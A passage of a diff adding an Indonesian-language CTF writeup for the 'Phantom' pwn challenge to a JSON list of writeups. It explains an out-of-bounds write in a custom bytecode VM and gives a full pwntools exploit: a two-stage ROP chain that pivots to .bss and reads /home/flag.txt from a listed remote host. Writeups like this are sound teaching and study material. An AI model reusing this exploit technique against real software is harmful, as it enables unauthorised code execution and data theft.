\"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "them2026-pwn-phantom-phantom-handout",
+    "title": "Phantom",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THEM 2026",
+    "tags": [],
+    "description": "Writeup for challenge Phantom",
+    "problemDescription": "Challenge ini adalah custom bytecode VM. Bug utamanya ada di instruksi `PEEK` dan `POKE`: nilai register dipakai sebagai index ke stack VM tanpa bounds check. Karena seluruh state VM disimpan di stack frame fungsi interpreter, index yang cukup besar bisa keluar dari area stack VM dan menimpa saved return address.\n\nSetelah return address milik interpreter bisa ditulis, exploit-nya tinggal:\n\n1. Tulis ROP chain tahap pertama ke saved RIP interpreter.\n2. Chain pertama memanggil `read(0, .bss, len(stage2))`.\n3. Setelah `read`, pivot `rsp` ke `.bss`.\n4. ROP tahap kedua menjalankan syscall `open(\"/home/flag.txt\", 0)`, `read(3, buf, 0x100)`, lalu `write(1, buf, 0x100)`.\n\nFlag yang keluar:\n\n`THEM?!CTF{ph4nt0m_byt3c0d3_vm_3sc4p3_m4st3r}`",
+    "tools": [],
+    "analysis": "Dari disassembly fungsi interpreter di `0x4019ee`, terlihat layout penting di stack:\n\n- buffer bytecode ada di sekitar `rbp-0xb00`\n- register VM ada di sekitar `rbp-0x2f0`\n- stack VM ada di sekitar `rbp-0x270`\n\nAda dispatcher opcode `0x00` sampai `0x17`. Beberapa opcode penting yang dipakai waktu eksploitasi:\n\n- `0x02` = `PUSH imm64`\n- `0x03` = `POP reg`\n- `0x15` = `POKE reg`\n- `0x17` = `INC reg`\n\nInstruksi `POKE` kira-kira bekerja seperti ini:\n\n```c\nidx = regs[reg];\nvalue = vm_stack[sp - 1];\nvm_stack[idx] = value;\n```\n\nMasalahnya, `idx` tidak pernah dicek.\n\nAddressing yang dipakai `POKE` adalah:\n\n```c\n[rbp + (idx + 0x112) * 8 - 0xb00]\n```\n\nKalau dihitung:\n\n- `idx = 0` mengarah ke awal stack VM\n- `idx = 79` mengarah ke `rbp + 8`, yaitu saved RIP interpreter\n\nItu artinya kita punya primitive write 8-byte ke return address hanya dengan:\n\n1. isi sebuah register dengan `79`\n2. `PUSH` nilai target\n3. `POKE` ke register tadi\n\nSaya validasi dulu dengan payload kecil yang menulis `0x4141414141414141` ke index `79`, dan proses langsung crash saat interpreter return. Berarti kontrol RIP benar-benar kena.",
+    "solution": [
+      {
+        "title": "Recon",
+        "content": "Binary:\n\n- ELF 64-bit\n- static\n- stripped\n- NX enabled\n- No PIE\n- No canary\n\nKarena static dan non-PIE, alamat gadget ROP tetap. Ini sangat membantu begitu kita dapat arbitrary write ke return address.\n\nPrompt program:\n\n\n\nJadi input pertama adalah satu baris hex, lalu bytecode hasil decode dieksekusi oleh VM.",
+        "code": "Submit your phantom script as hex-encoded bytecode.\nMax code size: 2048 bytes (4096 hex chars)"
+      },
+      {
+        "title": "Tahap 1: tulis ROP awal ke stack return interpreter",
+        "content": "Karena kita belum punya tempat yang nyaman untuk chain panjang, saya tulis ROP kecil langsung ke area return interpreter:\n\n\n\nGadget yang dipakai:\n\n- `pop rdi ; ret`\n- `pop rsi ; ret`\n- `pop rdx ; pop rbx ; ret`\n- `pop rax ; ret`\n- `syscall ; ret`\n- `pop rsp ; ret`\n\nKeuntungannya:\n\n- stage pertama pendek\n- tidak perlu tahu alamat stack runtime\n- stage kedua bisa dikirim raw binary setelah hex bytecode selesai dibaca",
+        "code": "read(0, .bss, len(stage2));\npivot rsp = .bss;"
+      },
+      {
+        "title": "Tahap 2: ROP penuh di `.bss`",
+        "content": "Setelah `read`, stack dipindah ke `.bss`, lalu chain kedua jalan:\n\n1. `open(\"/home/flag.txt\", 0)`\n2. `read(3, FLAG_BUF, 0x100)`\n3. `write(1, FLAG_BUF, 0x100)`\n4. `exit(0)`\n\nSaya sengaja pakai fd `3` setelah `open`, karena untuk service model begini stdin/stdout/stderr biasanya `0/1/2`, jadi file pertama yang dibuka program akan jadi `3`. Di remote ini valid."
+      },
+      {
+        "title": "Kenapa Bisa Kirim Stage 2 Setelah Hex?",
+        "content": "Program hanya membaca satu line hex untuk parser VM. Setelah itu file descriptor `stdin` tetap hidup. Begitu interpreter selesai dan control flow pindah ke ROP tahap pertama, chain tadi memanggil `read(0, .bss, len(stage2))`.\n\nJadi format kirimnya:\n\n1. `sendline(hex(stage1_vm_bytecode))`\n2. `send(stage2_raw_rop)`\n\nTidak perlu koneksi kedua."
+      },
+      {
+        "title": "Exploit Script",
+        "content": "Script final ada di:\n\n- `exploit.py`\n\nJalankan:\n\n\n\nMode lokal juga ada:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 exploit.py"
+      },
+      {
+        "title": "Potongan Bug yang Paling Penting",
+        "content": "Secara konsep, ini bagian yang fatal:\n\n\n\nTanpa validasi bahwa `target` masih berada dalam batas stack VM.\n\nBegitu nilai register bisa diisi bebas dengan `PUSH imm64` lalu `POP reg`, custom VM ini pada dasarnya memberi arbitrary indexed write ke stack frame interpreter.",
+        "code": "target = regs[user_reg];\nvm_stack[target] = popped_value;"
+      },
+      {
+        "title": "Catatan Akhir",
+        "content": "Hal yang bikin challenge ini cepat runtuh:\n\n- state VM diletakkan di stack\n- register bisa berisi angka 64-bit bebas\n- `PEEK/POKE` tidak membatasi index\n- binary non-PIE, jadi ROP address tetap\n\nBegitu satu saja dari poin itu diperbaiki, exploit-nya jauh lebih ribet. Yang paling tepat tentu menambahkan bounds check di `PEEK` dan `POKE`, dan idealnya memisahkan state VM ke heap atau struct yang tidak berdampingan dengan control data fungsi."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "code": "from pwn import *\r\n\r\n\r\nHOST = \"45.130.164.173\"\r\nPORT = 30207\r\n\r\nPOP_RDI = 0x4032B8\r\nPOP_RSI = 0x40B9A8\r\nPOP_RDX_RBX = 0x463777\r\nPOP_RAX = 0x40FCBF\r\nPOP_RSP = 0x405981\r\nSYSCALL_RET = 0x412BB2\r\n\r\nBSS = 0x4A9000\r\nREAD_BUF = BSS\r\nFLAG_BUF = BSS + 0x300\r\n\r\nVM_HALT = 0x00\r\nVM_PUSH = 0x02\r\nVM_POP = 0x03\r\nVM_POKE = 0x15\r\nVM_INC = 0x17\r\n\r\n\r\ndef vm_push_imm(x):\r\n    return p8(VM_PUSH) + p64(x & 0xFFFFFFFFFFFFFFFF)\r\n\r\n\r\ndef vm_pop_reg(r):\r\n    return p8(VM_POP) + p8(r)\r\n\r\n\r\ndef vm_poke(r):\r\n    return p8(VM_POKE) + p8(r)\r\n\r\n\r\ndef vm_inc(r):\r\n    return p8(VM_INC) + p8(r)\r\n\r\n\r\ndef build_stage2():\r\n    chain = flat(\r\n        POP_RDI,\r\n        READ_BUF + 0x200,\r\n        POP_RSI,\r\n        0,\r\n        POP_RDX_RBX,\r\n        0,\r\n        0,\r\n        POP_RAX,\r\n        2,\r\n        SYSCALL_RET,\r\n        POP_RDI,\r\n        3,\r\n        POP_RSI,\r\n        FLAG_BUF,\r\n        POP_RDX_RBX,\r\n        0x100,\r\n        0,\r\n        POP_RAX,\r\n        0,\r\n        SYSCALL_RET,\r\n        POP_RDI,\r\n        1,\r\n        POP_RSI,\r\n        FLAG_BUF,\r\n        POP_RDX_RBX,\r\n        0x100,\r\n        0,\r\n        POP_RAX,\r\n        1,\r\n        SYSCALL_RET,\r\n        POP_RDI,\r\n        0,\r\n        POP_RAX,\r\n        60,\r\n        SYSCALL_RET,\r\n    )\r\n    chain = chain.ljust(0x200, b\"\\x00\")\r\n    return chain + b\"/home/flag.txt\\x00\"\r\n\r\n\r\ndef build_stage1(stage2_len):\r\n    first_chain = [\r\n        POP_RDI,\r\n        0,\r\n        POP_RSI,\r\n        READ_BUF,\r\n        POP_RDX_RBX,\r\n        stage2_len,\r\n        0,\r\n        POP_RAX,\r\n        0,\r\n        SYSCALL_RET,\r\n        POP_RSP,\r\n        READ_BUF,\r\n    ]\r\n\r\n    code = bytearray()\r\n    code += vm_push_imm(79)\r\n    code += vm_pop_reg(0)\r\n    for q in first_chain:\r\n        code += vm_push_imm(q)\r\n        code += vm_poke(0)\r\n        code += vm_inc(0)\r\n    code += p8(VM_HALT)\r\n    return bytes(code)\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        return process([\"./challenge/phantom\"])\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef main():\r\n    context.arch = \"amd64\"\r\n    io = start()\r\n\r\n    stage2 = build_stage2()\r\n    stage1 = build_stage1(len(stage2))\r\n\r\n    io.recvuntil(b\"phantom> \")\r\n    io.sendline(stage1.hex().encode())\r\n    io.send(stage2)\r\n\r\n    data = io.recvall(timeout=5)\r\n    print(data.decode(\"latin-1\", errors=\"replace\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "CTF{ph4nt0m_byt3c0d3_vm_3sc4p3_m4st3r}",
     "lessonsLearned": ""
   }
 ];
